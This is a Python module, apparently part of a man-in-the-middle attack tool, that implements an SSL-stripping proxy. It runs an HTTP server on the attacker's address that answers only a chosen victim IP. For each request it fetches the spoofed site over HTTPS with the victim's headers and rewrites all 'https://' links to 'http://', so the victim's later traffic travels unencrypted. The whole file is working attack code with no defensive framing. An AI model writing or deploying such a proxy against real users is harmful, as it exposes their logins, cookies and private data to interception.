from logger import log_info, log_warning
import http.client
import http.server
import socketserver
import requests

site_to_spoof = None
ip_victim = None
ip_attacker = None

# Custom HTTP request handler that only allows requests from the victim.
class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        # Get the client's IP address
        client_ip = self.client_address[0]
        
        # Check if the client's IP address matches the allowed IP
        if client_ip == ip_victim:
            # Print request path and headers
            print("Received GET request")
            print("Path:", self.path)
            print("Headers:", self.headers)

            response = requests.get("https://" + site_to_spoof + self.path, headers=self.headers)

            # Replace all "https://" with "http://"
            response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')

            # Send the response back to the client
            self.send_response(response.status_code)
            self.end_headers()
            self.wfile.write(response_content)
        else:
            # Send a 403 Forbidden response
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b'403 Forbidden: Access denied')
        super().do_GET()

class Forwarder:
    def __init__(self, interface, ip_attacker_, ip_victim_, site_to_spoof_):
        global ip_victim, site_to_spoof, ip_attacker
        self.interface = interface
        ip_attacker = ip_attacker_
        ip_victim = ip_victim_
        site_to_spoof = site_to_spoof_

    def forward(self):
        log_info("Starting packet forwarding")

        # Start listening for HTTP requests from the victim
        log_info("Starting HTTP server")
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer((ip_attacker, 80), CustomHTTPRequestHandler)
        httpd.serve_forever()

        log_warning("Stopping packet forwarding")
